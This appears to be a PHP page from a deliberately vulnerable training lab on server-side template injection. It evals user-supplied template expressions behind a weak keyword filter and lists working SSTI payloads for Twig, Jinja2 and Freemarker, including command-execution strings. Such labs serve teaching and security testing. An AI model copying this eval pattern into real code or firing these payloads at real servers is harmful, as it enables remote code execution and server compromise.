<?php
// Simple (and vulnerable) template engine simulation
function renderTemplate($template, $data = []) {
    // VULNERABLE: Direct eval of template code
    $output = $template;
    
    // Replace variables
    foreach ($data as $key => $value) {
        $output = str_replace('{{' . $key . '}}', $value, $output);
    }
    
    // Check for template injection patterns
    if (preg_match('/\{\{.*\}\}/', $output)) {
        // Extract template expression
        preg_match('/\{\{(.*?)\}\}/', $output, $matches);
        if (isset($matches[1])) {
            $expression = $matches[1];
            
            // DANGEROUS: Evaluate PHP code
            if (strpos($expression, 'php') !== false) {
                $expression = str_replace(['php', 'echo', 'print', 'system'], '', $expression);
            }
            
            try {
                // Even more dangerous - use eval
                ob_start();
                $result = eval('return ' . $expression . ';');
                ob_end_clean();
                
                $output = preg_replace('/\{\{.*?\}\}/', $result, $output);
            } catch (Exception $e) {
                $output = "Template error: " . $e->getMessage();
            }
        }
    }
    
    return $output;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $template = $_POST['template'] ?? '';
    $name = $_POST['name'] ?? 'Guest';
    
    $data = [
        'name' => $name,
        'date' => date('Y-m-d'),
        'time' => date('H:i:s')
    ];
    
    echo "<h3>Template Output:</h3>";
    echo "<div style='background:#f8f9fa;padding:20px;border:2px solid #3498db;border-radius:5px;'>";
    echo nl2br(htmlspecialchars(renderTemplate($template, $data)));
    echo "</div>";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>SSTI Test</title>
    <style>
        body { padding: 20px; font-family: Arial; }
        textarea { width: 100%; height: 200px; font-family: monospace; }
        input { padding: 10px; width: 300px; }
        .example { background: #333; color: #0f0; padding: 15px; margin: 10px 0; font-family: monospace; }
        .warning { background: #f8d7da; padding: 15px; margin: 20px 0; }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #3498db;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.3s ease;
        }
    </style>
</head>
<body>
    <h2>📝 Server-Side Template Injection (SSTI)</h2>
    
    <form method="POST">
        <p>Name: <input type="text" name="name" value="John"></p>
        
        <p>Template:</p>
        <textarea name="template">
Hello {{name}}!

Today is {{date}} at {{time}}.

Debug: {{7*7}}
        </textarea><br>
        <button type="submit">Render Template</button>
    </form>
    
    <div class="example">
<strong>SSTI Payloads for Different Engines:</strong><br><br>
<strong>Generic:</strong><br>
{{7*7}} → 49<br>
{{config}} → Dump configuration<br><br>

<strong>Twig (PHP):</strong><br>
{{_self.env.registerUndefinedFilterCallback("exec")}}<br>
{{_self.env.getFilter("id")}}<br><br>

<strong>Jinja2 (Python):</strong><br>
{{ config.items() }}<br>
{{ ''.__class__.__mro__[1].__subclasses__() }}<br><br>

<strong>Freemarker (Java):</strong><br>
${"freemarker.template.utility.Execute"?new()("whoami")}
    </div>
    
    <div class="warning">
        <strong>⚠️ SSTI Impact:</strong>
        <ul>
            <li>Remote code execution</li>
            <li>Read sensitive files</li>
            <li>Server compromise</li>
            <li>Full system access</li>
        </ul>
    </div>
    <a href="nav.php" class="back-link">← Back to Main Menu</a>
</body>
</html>
